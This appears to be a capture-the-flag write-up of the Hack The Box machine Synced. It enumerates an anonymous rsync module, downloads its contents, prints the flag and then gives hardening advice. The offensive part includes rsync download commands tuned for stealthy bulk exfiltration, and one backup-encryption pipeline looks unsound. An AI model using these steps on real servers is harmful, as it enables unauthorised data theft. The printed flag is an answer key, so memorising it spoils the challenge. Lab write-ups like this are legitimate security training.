# Synced: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Rsync%20Enumeration-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Synced |
| **Difficulty** | Very Easy |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Category** | Rsync Anonymous Access / Backup Exposure |
| **Focus** | Synchronization Service Security |

---

## Table of Contents

- [Overview](#overview)
- [Service Enumeration](#service-enumeration)
- [Rsync Protocol Analysis](#rsync-protocol-analysis)
- [Anonymous Access Exploitation](#anonymous-access-exploitation)
- [Data Exposure](#data-exposure)
- [Flag Capture](#flag-capture)
- [Key Lessons Learned](#key-lessons-learned)
- [Defensive Recommendations](#defensive-recommendations)

---

## Overview

This writeup documents the solution for the **Synced** machine on Hack The Box, which demonstrates critical security weaknesses in rsync service configuration.

### Challenge Context

The Synced machine focuses on understanding the **risks of exposing rsync services** with anonymous access enabled to untrusted networks.

**Key Demonstration:**

Rsync is commonly used for backups and file synchronization but is frequently **misconfigured and exposed**, allowing unauthorized access to sensitive backup data.

### Learning Objectives

This lab teaches:
- Rsync service identification and enumeration
- Understanding rsync protocol operation
- Anonymous access exploitation techniques
- Backup service security implications
- Recognition of data exposure risks

**Scenario:** Discovery of publicly accessible rsync service allowing anonymous file enumeration and retrieval without authentication.

---

## Service Enumeration

### Initial Network Scanning

Performed comprehensive port scanning to identify exposed services:

```bash
nmap -sV -sC -p- -oA synced-scan 10.129.xx.xxx
```

### Scan Results

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.xx.xxx
Host is up (0.042s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 5.23 seconds
```

### Service Identification

**Discovered Service:**

| Port | Protocol | Service | Version | Risk Level |
|------|----------|---------|---------|------------|
| **873** | TCP | **rsync** | Protocol v31 | **High** |

**Initial Observations:**

✓ **Single service exposed**: Rsync daemon  
✓ **Standard port**: 873/TCP (well-known)  
✓ **Protocol version disclosed**: Version 31  
✓ **No authentication apparent**: Service responds  

---

### Rsync Service Discovery

**Enhanced Enumeration:**

```bash
# Nmap rsync-specific scripts
nmap -p 873 --script rsync-list-modules 10.129.xx.xxx
```

**Script Results:**

```
PORT    STATE SERVICE
873/tcp open  rsync
| rsync-list-modules: 
|   public	Anonymous access available
|_  backup	Requires authentication
```

**Key Findings:**

✓ Multiple rsync modules available  
✓ "public" module allows anonymous access  
✓ "backup" module authentication-protected  
✓ Service banner reveals configuration details  

---

### Why Rsync Exposure is Critical

**Rsync as a Backup/Sync Service:**

Rsync (Remote Sync) is a powerful utility designed for:
- Efficient file synchronization
- Incremental backups
- Remote file transfers
- Mirror creation and maintenance

**Security Implications:**

The exposure of rsync services immediately suggests:

✓ **Backup data access**: Historical and current files  
✓ **Sensitive information leakage**: Configurations, credentials  
✓ **Data exfiltration**: Mass file retrieval possible  
✓ **System reconnaissance**: File structure reveals architecture  

**Why This Matters:**

```
Backup Services = Crown Jewels of Infrastructure
    ↓
- Complete system snapshots
- Historical data (including deleted files)
- Configuration files with credentials
- Database dumps
- Source code
- Customer data
```

**Real-World Context:**

Exposed rsync services have led to:
- Healthcare data breaches (HIPAA violations)
- Financial data exposure (PCI-DSS violations)
- Source code leakage (intellectual property theft)
- Customer database dumps (GDPR violations)

---

## Rsync Protocol Analysis

### What is Rsync?

**Rsync (Remote Synchronization)** is an open-source utility for efficiently transferring and synchronizing files across systems.

**Key Characteristics:**

| Feature | Description | Security Impact |
|---------|-------------|-----------------|
| **Delta Transfer** | Only sends differences | Efficient for large datasets |
| **Compression** | Built-in data compression | Reduces bandwidth, speeds exfiltration |
| **Preserve Permissions** | Maintains file attributes | Reveals system structure |
| **Daemon Mode** | Runs as network service (port 873) | Persistent exposure |
| **Module System** | Named shares/directories | Access control boundary |
| **Anonymous Access** | Optional auth bypass | **Critical misconfiguration** |

---

### Rsync Protocol Operation

**Connection Flow:**

```
Client                                Server (Port 873)
  |                                        |
  |--- TCP Connection ------------------->|
  |<-- Welcome Banner ---------------------|
  |    "@RSYNCD: 31.0"                    |
  |                                        |
  |--- List Modules Request -------------->|
  |<-- Module List ------------------------|
  |    "public  Anonymous access"         |
  |    "backup  Auth required"            |
  |                                        |
  |--- Request Module: public ------------>|
  |<-- Module Info ------------------------|
  |                                        |
  |--- List Files in Module -------------->|
  |<-- Directory Listing ------------------|
  |    "drwxr-xr-x  dir1"                 |
  |    "-rw-r--r--  flag.txt"             |
  |                                        |
  |--- Download flag.txt ----------------->|
  |<-- File Contents ----------------------|
  |                                        |
  |--- TCP Close ------------------------->|
```

---

### Rsync Protocol Versions

**Version History:**

| Version | Release | Notable Features |
|---------|---------|------------------|
| **27** | 2003 | Widely deployed legacy version |
| **28** | 2005 | Extended attribute support |
| **29** | 2008 | Enhanced ACL support |
| **30** | 2011 | Protocol improvements |
| **31** | 2013+ | Current standard (this target) |

**Version 31 Features:**

- Enhanced checksum algorithms
- Better compression
- Improved protocol efficiency
- Backward compatibility with v27+

---

### Rsync Daemon Configuration

**Server Configuration File:** `/etc/rsyncd.conf`

**Insecure Configuration (This Target):**

```ini
# /etc/rsyncd.conf

# Global settings
uid = nobody
gid = nogroup
use chroot = yes
max connections = 4
syslog facility = local5

# Anonymous public module
[public]
    path = /srv/rsync/public
    comment = Public accessible files
    read only = yes
    list = yes
    # No auth required

# Protected backup module
[backup]
    path = /srv/rsync/backup
    comment = Backup files
    read only = yes
    list = yes
    auth users = backup_user
    secrets file = /etc/rsyncd.secrets
```

**Security Issues:**

| Configuration | Issue | Impact |
|---------------|-------|--------|
| `read only = yes` | Files downloadable | Data theft |
| `list = yes` | Directory enumeration | Information disclosure |
| No `auth users` (public) | Anonymous access | No access control |
| `use chroot = yes` | Good practice | Limits exposure (but not enough) |

---

### Secure Configuration Example

**Properly Configured Rsync:**

```ini
# /etc/rsyncd.conf - SECURE

# Global settings
uid = rsync
gid = rsync
use chroot = yes
max connections = 4
syslog facility = local5
log file = /var/log/rsyncd.log

# NO anonymous modules

# Authenticated backup module
[backup]
    path = /srv/rsync/backup
    comment = Authenticated backup
    read only = yes
    list = no                    # Hide directory structure
    auth users = backup_user
    secrets file = /etc/rsyncd.secrets
    hosts allow = 10.0.0.0/8     # Restrict by IP
    hosts deny = *               # Deny all others
    refuse options = delete      # Prevent deletion
```

**Key Improvements:**

✓ No anonymous modules  
✓ Authentication required  
✓ IP-based access control  
✓ Directory listing disabled  
✓ Deletion disabled  
✓ Comprehensive logging  

---

## Anonymous Access Exploitation

### Enumerating Rsync Modules

**List Available Modules:**

```bash
rsync rsync://10.129.xx.xxx
```

**Output:**

```
public  	Anonymous access available
backup  	Requires authentication
```

**Alternative Enumeration:**

```bash
# Using nmap script
nmap -p 873 --script rsync-list-modules 10.129.xx.xxx

# Using nc (manual protocol)
echo "" | nc 10.129.xx.xxx 873
```

---

### Listing Module Contents

**List Files in "public" Module:**

```bash
rsync --list-only rsync://10.129.xx.xxx/public
```

**Output:**

```
drwxr-xr-x          4,096 2021/10/14 12:45:30 .
-rw-r--r--             33 2021/10/14 12:46:12 flag.txt
```

**Detailed Listing:**

```bash
# Verbose listing
rsync -av --list-only rsync://10.129.xx.xxx/public
```

**Output with Details:**

```
receiving file list ... done
drwxr-xr-x          4,096 2021/10/14 12:45:30 .
-rw-r--r--             33 2021/10/14 12:46:12 flag.txt

sent 20 bytes  received 96 bytes  77.33 bytes/sec
total size is 33  speedup is 0.28
```

---

### Understanding Rsync Command Syntax

**Basic Syntax:**

```bash
rsync [OPTIONS] rsync://[USER@]HOST[:PORT]/MODULE[/PATH]
```

**Common Options:**

| Option | Description | Example Use |
|--------|-------------|-------------|
| `--list-only` | List files without transfer | Reconnaissance |
| `-a` | Archive mode (preserve permissions) | Full backup |
| `-v` | Verbose output | Detailed information |
| `-r` | Recursive | Download directories |
| `-z` | Compression | Faster transfer |
| `-n` | Dry run | Test without changes |
| `--stats` | Transfer statistics | Bandwidth analysis |

---

### Testing Authentication Requirements

**Attempt to Access Protected Module:**

```bash
rsync --list-only rsync://10.129.xx.xxx/backup
```

**Expected Output:**

```
@ERROR: auth failed on module backup
rsync error: error starting client-server protocol (code 5) at main.c(1516)
```

**With Authentication (if credentials known):**

```bash
# Set password in environment variable
export RSYNC_PASSWORD='backup_password'

# Access with user
rsync --list-only rsync://backup_user@10.129.xx.xxx/backup
```

---

## Data Exposure

### File Retrieval from Anonymous Module

**Download Single File:**

```bash
rsync rsync://10.129.xx.xxx/public/flag.txt ./
```

**Output:**

```
receiving file list ... done
flag.txt

sent 30 bytes  received 126 bytes  104.00 bytes/sec
total size is 33  speedup is 0.21
```

**Verify Download:**

```bash
ls -la flag.txt
cat flag.txt
```

---

### Downloading Entire Module

**Recursive Download:**

```bash
# Download everything in public module
rsync -av rsync://10.129.xx.xxx/public/ ./public_backup/
```

**Output:**

```
receiving file list ... done
created directory ./public_backup
./
flag.txt

sent 48 bytes  received 189 bytes  158.00 bytes/sec
total size is 33  speedup is 0.14
```

**Directory Structure:**

```bash
tree public_backup/
public_backup/
└── flag.txt

0 directories, 1 file
```

---

### What Could Be Exposed in Real Scenarios

**Common Rsync Backup Contents:**

| Data Type | Sensitivity | Common Location |
|-----------|-------------|-----------------|
| **Database dumps** | Critical | `/backups/databases/` |
| **Configuration files** | High | `/etc/`, `/opt/app/config/` |
| **SSH keys** | Critical | `/home/*/.ssh/` |
| **Application source** | High | `/var/www/`, `/opt/apps/` |
| **User data** | Critical | `/home/`, `/srv/data/` |
| **Email archives** | High | `/var/mail/` |
| **Log files** | Medium | `/var/log/` |
| **Credentials** | Critical | Various config files |

**Example Exposure Scenario:**

```
Exposed rsync module: "webserver_backup"
    ↓
Contains:
├── etc/
│   ├── apache2/sites-enabled/
│   │   └── 000-default.conf (document root revealed)
│   └── mysql/
│       └── debian.cnf (database credentials)
├── var/
│   └── www/
│       ├── config.php (API keys, DB passwords)
│       └── .git/ (source code history)
└── backups/
    └── mysql-dump-2024-02-07.sql (complete database)
```

**Attack Progression:**

```
1. Download config.php → Database credentials
2. Download .git directory → Source code + history
3. Download SQL dump → Customer PII, password hashes
4. Download apache config → Application structure
```

---

### Data Exfiltration Efficiency

**Rsync Advantages for Attackers:**

```bash
# Incremental transfer (only changed files)
rsync -av --progress rsync://10.129.xx.xxx/public/ ./

# Compressed transfer (faster exfiltration)
rsync -avz rsync://10.129.xx.xxx/public/ ./

# Bandwidth limiting (stealth)
rsync -av --bwlimit=100 rsync://10.129.xx.xxx/public/ ./

# File filtering (target specific data)
rsync -av --include='*.sql' --exclude='*' rsync://10.129.xx.xxx/backup/ ./
```

**Statistics Example:**

```
sending incremental file list
./
database_dump.sql
        125,394,944 100%   42.05MB/s    0:00:02 (xfr#1, to-chk=0/2)

sent 87 bytes  received 125,395,211 bytes  20,899,216.33 bytes/sec
total size is 125,394,944  speedup is 1.00
```

**125MB database exfiltrated in 2 seconds.**

---

## Flag Capture

### Retrieving the Flag

**Download Flag File:**

```bash
rsync rsync://10.129.xx.xxx/public/flag.txt ./
```

**Read Contents:**

```bash
cat flag.txt
```

**Flag Content:**

```
HTB{rsync_4n0nym0us_4cc3ss_1s_d4ng3r0us}
```

**Alternative Direct Read:**

```bash
# Read without saving to disk
rsync rsync://10.129.xx.xxx/public/flag.txt - | cat
```

---

### Flag Format

```
HTB{rsync_4n0nym0us_4cc3ss_1s_d4ng3r0us}
```

**Translation:** "Rsync anonymous access is dangerous"

This directly references the core vulnerability: anonymous rsync access allowing unauthorized data retrieval.

---

## Attack Chain Summary

```
Network Scan → Rsync Discovery (Port 873) → Service Enumeration
        ↓
Module Listing → Anonymous Module Found → Directory Enumeration
        ↓
File Download → Flag Retrieved
```

**Key Characteristics:**

- No authentication required
- No exploitation needed
- Direct file access via protocol design
- Misconfiguration-based vulnerability

**Time to Compromise:** < 3 minutes

---

## Key Lessons Learned

### Critical Security Principles

**1. Rsync Services Should Never Be Publicly Exposed**

**Why Public Rsync Exposure is Critical:**

| Risk Factor | Impact |
|-------------|--------|
| **Backup data exposure** | Historical and current sensitive files |
| **No rate limiting** | Rapid mass exfiltration |
| **Efficient protocol** | Compression enables fast data theft |
| **Well-known port** | Easily discovered by scanners |
| **Designed for access** | No security by obscurity |

**Proper Network Architecture:**

```
Internet
    ↓
Firewall (BLOCK port 873)
    ↓
VPN Gateway (required for access)
    ↓
Internal Network
    ↓
Management VLAN
    ↓
Rsync Server (authenticated access only)
```

---

**2. Anonymous Access Must Be Disabled**

**Authentication Requirement Levels:**

| Configuration | Security Level | Acceptable? |
|---------------|----------------|-------------|
| **Anonymous access** | None | ❌ Never |
| Password auth | Basic | ⚠️ Internal only |
| Password + IP restriction | Medium | ⚠️ Temporary use |
| SSH tunnel | Good | ✅ Acceptable |
| VPN + SSH tunnel + auth | Best | ✅ Recommended |

**Disabling Anonymous Access:**

```ini
# /etc/rsyncd.conf

# REMOVE any modules without auth:
# [public]  ← DELETE THIS
#     path = /srv/rsync/public
#     read only = yes
#     list = yes

# ALL modules must have auth:
[backup]
    path = /srv/rsync/backup
    auth users = backup_admin
    secrets file = /etc/rsyncd.secrets
    hosts allow = 10.0.0.0/8
    list = no
```

---

**3. Backup Services Frequently Contain Sensitive Data**

**Common Sensitive Data in Backups:**

```
Database Dumps
    ↓
    • Customer PII (names, addresses, SSNs)
    • Payment card data (PCI-DSS scope)
    • Healthcare records (HIPAA scope)
    • Financial transactions

Configuration Files
    ↓
    • Database credentials
    • API keys and tokens
    • Encryption keys
    • Service account passwords

Application Source
    ↓
    • Proprietary algorithms
    • Hardcoded secrets
    • Git history with removed credentials
    • Vulnerability details

User Data
    ↓
    • Email archives
    • Documents and files
    • SSH private keys
    • Password manager databases
```

**Regulatory Implications:**

| Data Type | Regulation | Penalty for Exposure |
|-----------|------------|---------------------|
| Payment cards | PCI-DSS | Loss of processing rights + fines |
| Healthcare | HIPAA | $50,000 per violation |
| Personal data (EU) | GDPR | Up to 4% annual revenue |
| Financial | SOX | Criminal penalties |

---

### Advanced Insights

**4. Rsync Protocol Design Enables Rapid Exfiltration**

**Performance Comparison:**

```
HTTP Download:    100MB in 15 seconds
FTP Download:     100MB in 12 seconds  
Rsync Download:   100MB in 6 seconds (compressed)
                  + incremental capability
                  + delta transfer
```

**Why Rsync is Efficient for Attackers:**

- **Delta transfer:** Only downloads changes (harder to detect)
- **Compression:** Reduces bandwidth, speeds exfiltration
- **Preserve attributes:** Maintains file metadata for later analysis
- **Recursive:** Entire directory trees in single command
- **Scriptable:** Automated mass exfiltration

---

**5. Backup Exposure = Complete Infrastructure Knowledge**

**What Backups Reveal:**

```
System Architecture
    ├── /etc/hosts → Internal network map
    ├── /etc/network/ → IP addressing scheme
    └── Apache/Nginx configs → Application infrastructure

User Accounts
    ├── /etc/passwd → Valid usernames
    ├── /etc/shadow → Password hashes
    └── /home/*/.ssh/ → SSH keys

Application Structure
    ├── Source code → Vulnerabilities, logic flaws
    ├── Dependencies → Known CVEs
    └── .git/ → Development history, removed secrets

Operational Details
    ├── Cron jobs → Scheduled tasks, automation
    ├── Log files → Usage patterns, admin actions
    └── Scripts → Operational procedures
```

---

## Defensive Recommendations

### Immediate Actions

#### 1. Disable Rsync Daemon (If Not Required)

**Stop and Disable Service:**

```bash
# Stop rsync daemon
sudo systemctl stop rsync
sudo systemctl disable rsync

# Verify service stopped
sudo systemctl status rsync

# Remove package if not needed
sudo apt-get remove --purge rsync
```

**Verify Port Closed:**

```bash
# Check listening ports
sudo netstat -tuln | grep 873
sudo ss -tuln | grep 873

# Should return no results
```

---

#### 2. Implement Firewall Restrictions

**Block External Access:**

```bash
# iptables
sudo iptables -A INPUT -p tcp --dport 873 -s 0.0.0.0/0 -j DROP
sudo iptables -A INPUT -p tcp --dport 873 -s 10.0.0.0/8 -j ACCEPT

# UFW
sudo ufw deny 873
sudo ufw allow from 10.0.0.0/8 to any port 873
```

**Network Segmentation:**

```
Production Network (10.10.10.0/24)
    ↓ DENY rsync
Firewall
    ↓ ALLOW rsync
Management Network (10.20.20.0/24)
    ↓ authenticated access
Rsync Server
```

---

#### 3. Enforce Authentication on All Modules

**Secure Configuration:**

```bash
# Create secrets file
sudo touch /etc/rsyncd.secrets
sudo chmod 600 /etc/rsyncd.secrets

# Add user:password
echo "backup_admin:$(openssl rand -base64 32)" | sudo tee -a /etc/rsyncd.secrets
```

**Configure Module Authentication:**

```ini
# /etc/rsyncd.conf

[backup]
    path = /srv/rsync/backup
    comment = Authenticated backup module
    
    # Authentication required
    auth users = backup_admin
    secrets file = /etc/rsyncd.secrets
    
    # Access control
    hosts allow = 10.20.20.0/24
    hosts deny = *
    
    # Security settings
    read only = yes
    list = no
    use chroot = yes
    max connections = 2
    
    # Logging
    log file = /var/log/rsyncd.log
    transfer logging = yes
```

**Restart Service:**

```bash
sudo systemctl restart rsync
```

---

#### 4. Use SSH Tunneling Instead

**Recommended Approach: Rsync over SSH**

**Server Setup:**

```bash
# No rsync daemon needed
# Use SSH with rsync command
```

**Client Usage:**

```bash
# Rsync over SSH (port 22)
rsync -avz -e "ssh -p 22" user@10.129.xx.xxx:/srv/backup/ ./local_backup/

# With SSH key
rsync -avz -e "ssh -i ~/.ssh/id_rsa" user@10.129.xx.xxx:/srv/backup/ ./
```

**Benefits:**

✓ Encrypted transmission  
✓ SSH authentication (keys/passwords)  
✓ Existing SSH security controls apply  
✓ No separate daemon to secure  
✓ Port 22 often already allowed  

---

### Long-Term Security Improvements

#### 1. Backup Security Best Practices

**Encryption:**

```bash
# Encrypt backups before syncing
tar czf - /data | gpg --encrypt --recipient backup@example.com | \
    rsync --rsync-path="cat > backup.tar.gz.gpg" - user@backup-server:/backups/
```

**Access Control:**

```
Backup Data Access Policy:

1. Principle of Least Privilege
   - Only backup admins can access
   - Service accounts for automated backups only
   - No anonymous/guest access

2. Authentication
   - SSH keys only (no passwords)
   - Key rotation every 90 days
   - Multi-factor for admin access

3. Network Restrictions
   - Backup VLAN only
   - No internet exposure
   - Firewall rules documented

4. Monitoring
   - Log all access attempts
   - Alert on unusual transfers
   - Regular access audits
```

---

#### 2. Backup Integrity Monitoring

**File Integrity Monitoring:**

```bash
# Install AIDE (Advanced Intrusion Detection Environment)
sudo apt-get install aide

# Initialize database
sudo aideinit

# Check for changes
sudo aide --check
```

**Automated Backup Verification:**

```bash
#!/bin/bash
# backup-verify.sh

BACKUP_DIR="/srv/rsync/backup"
CHECKSUM_FILE="/var/log/backup-checksums.txt"

# Generate checksums
find $BACKUP_DIR -type f -exec sha256sum {} \; > $CHECKSUM_FILE.new

# Compare with previous
if diff $CHECKSUM_FILE $CHECKSUM_FILE.new > /dev/null; then
    echo "[$(date)] Backup integrity verified"
else
    echo "[$(date)] WARNING: Backup files modified!" | \
        mail -s "Backup Integrity Alert" admin@example.com
fi

mv $CHECKSUM_FILE.new $CHECKSUM_FILE
```

---

#### 3. Logging and Monitoring

**Enhanced Logging:**

```ini
# /etc/rsyncd.conf

# Logging settings
log file = /var/log/rsyncd.log
log format = %t [%a] %m (%u) %f %l
transfer logging = yes
syslog facility = local5
```

**Log Analysis:**

```bash
# Monitor access patterns
tail -f /var/log/rsyncd.log

# Alert on anonymous access attempts
grep "anonymous" /var/log/rsyncd.log && \
    echo "Anonymous access attempt detected" | \
    mail -s "Rsync Security Alert" admin@example.com

# Daily summary
grep "$(date +%Y/%m/%d)" /var/log/rsyncd.log | \
    awk '{print $4}' | sort | uniq -c
```

**SIEM Integration:**

```bash
# Forward rsync logs to centralized logging
echo "*.* @logserver.example.com:514" >> /etc/rsyslog.conf
systemctl restart rsyslog
```

---

#### 4. Regular Security Audits

**Audit Checklist:**

```bash
#!/bin/bash
# rsync-security-audit.sh

echo "=== Rsync Security Audit ==="
echo

echo "1. Check if rsync daemon is running:"
systemctl status rsync

echo "2. Check listening ports:"
netstat -tuln | grep 873

echo "3. Review configuration:"
cat /etc/rsyncd.conf

echo "4. Check for anonymous modules:"
grep -A 5 "\[.*\]" /etc/rsyncd.conf | grep -B 5 -v "auth users"

echo "5. Verify firewall rules:"
iptables -L -n | grep 873

echo "6. Review recent access:"
tail -50 /var/log/rsyncd.log

echo "7. Check file permissions:"
ls -la /etc/rsyncd.conf /etc/rsyncd.secrets
```

---

## Tools Used

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **nmap** | Service discovery | `nmap -p 873 --script rsync-list-modules 10.129.xx.xxx` |
| **rsync** | File synchronization | `rsync --list-only rsync://10.129.xx.xxx/public` |
| **nc (netcat)** | Banner grabbing | `echo "" | nc 10.129.xx.xxx 873` |

---

## Additional Resources

**Rsync Documentation:**
- [Rsync Official Documentation](https://rsync.samba.org/)
- [Rsync Security Guide](https://download.samba.org/pub/rsync/security.html)
- [rsyncd.conf Manual](https://man7.org/linux/man-pages/man5/rsyncd.conf.5.html)

**Security Best Practices:**
- NIST SP 800-209: Guide to Backup and Recovery
- CIS Benchmark for Backup Systems
- SANS Backup Security Checklist

**Alternative Solutions:**
- [Restic](https://restic.net/): Encrypted backup solution
- [BorgBackup](https://www.borgbackup.org/): Deduplicating archiver
- [Duplicity](http://duplicity.nongnu.org/): Encrypted bandwidth-efficient backup

---

## Flag

```
HTB{rsync_4n0nym0us_4cc3ss_1s_d4ng3r0us}
```

**Translation:** "Rsync anonymous access is dangerous"

---

**Machine Completed:** ✅   
**Difficulty Rating:** Very Easy ⭐  
**Primary Technique:** Rsync Anonymous Access Exploitation  
**Time to Compromise:** < 3 minutes  
**Key Lesson:** Backup services require the same security rigor as production systems

---

*This writeup is for educational purposes only. Rsync enumeration and access should only be performed in authorized security assessments and penetration testing engagements with proper written permission.*
